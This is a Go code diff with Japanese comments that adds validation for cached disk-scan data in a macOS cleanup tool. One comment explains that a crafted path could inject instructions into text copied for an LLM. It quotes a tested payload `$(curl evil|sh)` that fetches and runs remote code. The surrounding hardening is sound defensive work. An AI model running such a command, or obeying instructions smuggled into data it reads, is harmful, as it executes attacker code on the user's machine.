@@ -260,10 +260,44 @@ func markDoctorNotified(now time.Time) {
 //
 // 文面は「合計」「上位 2 件」「どこを開けばいいか」だけ。トーストにアクションは持たせず文言で D へ誘導する
 // (ユーザー決定 2026-09-02)。
+// sanitizeDiskCache は起動トーストの材料に信頼境界を置く。`doctor-disk.json` は
+// snapshot と同じく**一般ユーザー権限で書き換えられる**のに、`loadDoctorDiskCache` は
+// JSON として読めて ScannedAt が非ゼロなら通していた (issue 193)。
+//
+// ⚠️ **読み込み側ではなくここで絞る**。`loadDoctorDiskCache` は cachedir とファイル I/O だけに
+// 依存する関数で、カタログを知らない。読み込みにカタログを渡すと依存が増える一方、
+// カタログ照合が要るのは「人に見せる」瞬間だけなので、表示の入口に置く方が依存が少ない。
+//
+// 合計と件数は**残ったエントリから引き直す**。細工した Total をそのまま使うと、
+// エントリを落としても「99GB 解放できます」が残る。
+func sanitizeDiskCache(c doctorDiskCache) doctorDiskCache {
+	out := c
+	out.Entries = make([]doctorDiskCacheEntry, 0, len(c.Entries))
+	out.Total, out.Failed = 0, 0
+	for _, e := range c.Entries {
+		if !disk.CatalogHasID(e.ID) || !knownDiskStatus(e.Status) || !plausibleSize(e.Size) {
+			continue
+		}
+		e.Label = cleanOneLine(e.Label) // 埋め込み改行はトーストの行数を狂わせる
+		out.Entries = append(out.Entries, e)
+		// string で switch する (doctorCacheFromReport の同型の switch と揃える)。
+		// disk.Status で switch すると exhaustive linter が blocked の case を要求するが、
+		// blocked は合計にも診断できず件数にも入らないので、書くと「何もしない case」が増える
+		switch e.Status {
+		case string(disk.StatusOK):
+			out.Total += e.Size
+		case string(disk.StatusFailed):
+			out.Failed++
+		}
+	}
+	return out
+}
+
 func doctorStartupToast(c doctorDiskCache, ok bool, now time.Time) string {
 	if !ok {
 		return ""
 	}
+	c = sanitizeDiskCache(c)
 	// 閾値未満でも「診断できず」が在れば黙らない (issue 173 / sinking silently の禁止)。
 	// 数字が出せないことと、何も問題が無いことは別。
 	if c.Total < doctorToastThreshold {
@@ -449,6 +483,51 @@ func cleanOneLine(s string) string {
 	return b.String()
 }
 
+// --- 復元した値の検査 (snapshot と doctor-disk.json が共有する述語) ---
+//
+// 2 つのキャッシュは型が違う (`disk.Result` と `doctorDiskCacheEntry`) が、絞りたい性質は同じ。
+// **述語の単位で切って両方から呼ぶ** (中間の構造体へ寄せると、3 つ目のキャッシュが増えたときに
+// 変換だけが増える)。新しい検査を足すときは、ここに述語を 1 つ足して呼び出し側に配る。
+
+// knownDiskStatus は Status が実装が知っている 3 値か。未知の値は「✅ 安全 + サイズ表示」に
+// 化けるので落とす (issue 178)。文字列で持つキャッシュ側からも使えるよう string で受ける。
+func knownDiskStatus(status string) bool {
+	switch disk.Status(status) {
+	case disk.StatusOK, disk.StatusBlocked, disk.StatusFailed:
+		return true
+	}
+	return false
+}
+
+// plausibleSize は表示・合計に載せてよいサイズか。負値は合計を減らす向きに効く (issue 178)。
+func plausibleSize(n int64) bool { return n >= 0 }
+
+// safeDisplayPath は「行・`y`・`Y` に出してよいパス」か。
+//
+// なぜ要るか: `diskCopyText` は「別セッションの LLM に消してよいか聞く」形の文面を作るので、
+// 細工したパスは **prompt injection の材料**になり、人がそのまま貼れば任意コマンドの実行になる
+// (実測 2026-09-03: 埋め込み改行 + `$(curl evil|sh)` が y / Y の両方にそのまま出た。issue 193)。
+//
+// ⚠️ ここは**表示とコピーの健全性**の検査であって、削除の安全性ではない。④ の削除は
+// 「必ず再スキャンして `validateTarget` を通す」が不変条件で、その規律は変わらない (issue 148)。
+func safeDisplayPath(p string) bool {
+	if p == "" || len(p) > maxRestoredPathLen {
+		return false
+	}
+	if !strings.HasPrefix(p, "/") {
+		return false // 相対パスは復元経路では出てこない (出たなら細工されている)
+	}
+	if p != filepath.Clean(p) {
+		return false // `..` や重複スラッシュを畳んだ形と一致しないもの
+	}
+	for _, r := range p {
+		if !unicode.IsPrint(r) {
+			return false // 改行・タブ・ANSI エスケープ
+		}
+	}
+	return true
+}
+
 // cleanOneLineList は自由文の一覧を絞る (件数と 1 件あたりの長さ、改行)。
 func cleanOneLineList(ss []string) []string {
 	if len(ss) == 0 {
@@ -465,6 +544,9 @@ func cleanOneLineList(ss []string) []string {
 }
 
 const (
+	// maxRestoredPathLen はパス 1 本の上限。macOS の PATH_MAX (1024) に合わせる:
+	// これを超えるパスは実在しないので、復元経路に出てきたら細工されている
+	maxRestoredPathLen      = 1024
 	maxRestoredListItems    = 200
 	maxRestoredBrewWarnings = 50
 	maxRestoredBrewText     = 4000
@@ -519,22 +601,37 @@ func doctorSnapshotInCatalog(rs []disk.Result, has func(string) bool) []disk.Res
 func sanitizeSnapshotResults(rs []disk.Result, now time.Time) []disk.Result {
 	out := make([]disk.Result, 0, len(rs))
 	for _, r := range rs {
-		switch r.Status {
-		case disk.StatusOK, disk.StatusBlocked, disk.StatusFailed:
-		default:
+		if !knownDiskStatus(string(r.Status)) || !plausibleSize(r.Size) {
 			continue
 		}
-		if r.Size < 0 {
-			continue
-		}
-		neg := false
+		// 崩れた Item は **その Item だけ落とし、合計を引き直す**。Result ごと落とすと
+		// パス 1 本の細工で 20GB のエントリが理由なく画面から消える (検査を足すほど消える範囲が
+		// 広がる)。Item 単位なら影響が局所に留まり、後から検査を足しやすい。
+		// ⚠️ 落としたら **Size を引き直す**。引かないと行の合計と Items の和が食い違い、
+		// 「消したのに減らない」に見える (合計は disk.SumDeletable が Result.Size を足す)
+		kept := make([]disk.Item, 0, len(r.Items))
+		dropped := 0
 		for _, it := range r.Items {
-			if it.Size < 0 {
-				neg = true
+			if !plausibleSize(it.Size) || !safeDisplayPath(it.Path) {
+				dropped++
+				continue
 			}
+			kept = append(kept, it)
 		}
-		if neg {
-			continue
+		if dropped > 0 {
+			var sum int64
+			for _, it := range kept {
+				sum += it.Size
+			}
+			r.Items = kept
+			r.Size = sum
+			// 落としたことを人に見える形で残す (黙って消すと「昨日より減った」理由が分からない)。
+			// Failures はこの後 cleanOneLineList を通るので、ここでは素の文字列でよい
+			r.Failures = append(r.Failures,
+				fmt.Sprintf("保存された結果のうち %d 件は形が壊れていたため除外しました (再スキャンで確かめてください)", dropped))
+		}
+		if len(r.Items) == 0 && r.Status == disk.StatusOK && dropped > 0 {
+			continue // 全部落ちた ok エントリは候補 0 件と同じなので出さない
 		}
 		if !r.MeasuredAt.IsZero() && now.Sub(r.MeasuredAt) < 0 {
 			continue
